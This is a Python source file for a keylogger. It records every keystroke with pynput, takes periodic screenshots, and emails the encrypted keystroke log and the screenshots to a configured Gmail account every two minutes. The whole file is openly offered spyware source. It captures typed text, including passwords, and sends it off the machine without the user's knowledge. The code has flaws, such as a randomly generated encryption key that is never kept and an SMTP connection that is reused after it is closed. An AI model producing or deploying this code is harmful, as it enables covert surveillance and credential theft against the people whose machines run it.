from pynput.keyboard import Key, Listener
from smtplib import SMTP, SMTPAuthenticationError
from threading import Timer
from cryptography.fernet import Fernet
import pyscreenshot

EMAIL_ADDRESS = "YOUR_EMAIL"
EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
SEND_REPORT_EVERY = 120  # seconds
EMAIL_HOST = "smtp.gmail.com"
PORT = 587
SECRET = Fernet.generate_key()


class Keylogger:
    special_keys = {
        Key.space: " ",
        Key.enter: "[ENTER]\n",
        Key.esc: "[ESC]",
        Key.tab: "[TAB]",
        Key.backspace: "[BACKSPACE]",
        Key.ctrl: "[CTRL]",
        Key.shift: "[LEFT SHIFT]",
        Key.shift_r: "[RIGHT SHIFT]",
        Key.caps_lock: "[CAPS LOCK]",
        Key.alt_gr: "[ALT GR]"
    }

    def __init__(self, email, password, time_interval, secret, server):
        self.interval = time_interval
        self.log = ""
        self.email = email
        self.password = password
        self.f = Fernet(secret)
        self.server = server

    def update_log(self, str):
        self.log += str

    def on_release(self, key):
        try:
            name = key.char
        except AttributeError:
            name = Keylogger.special_keys.get(key, str(key))

        self.update_log(name.replace("'", ""))

    def encrypt_log(self):
        return self.f.encrypt(str.encode(self.log))

    def send_email(self, message):
        server = self.server
        # connect to the SMTP server as TLS mode
        server.starttls()
        try:
            email = self.email
            server.login(email, self.password)
            server.sendmail(email, email, message)
        except SMTPAuthenticationError:
            print("Username and Password not accepted.")
        finally:
            server.quit()

    def send_keys(self):
        if self.log:
            self.log = "\n\n" + self.log
            self.send_email(self.encrypt_log())

    def send_screenshot(self):
        self.send_email(pyscreenshot.grab())

    def report(self):
        self.send_keys()
        self.send_screenshot()
        self.log = ""
        timer = Timer(self.interval, self.report)
        timer.start()

    def start(self):
        # collect events until released
        with Listener(on_release=self.on_release) as listener:
            self.report()
            listener.join()


def main():
    kl = Keylogger(
        EMAIL_ADDRESS,
        EMAIL_PASSWORD,
        SEND_REPORT_EVERY,
        SECRET,
        SMTP(
            host=EMAIL_HOST,
            port=PORT))
    kl.start()


if __name__ == "__main__":
    main()
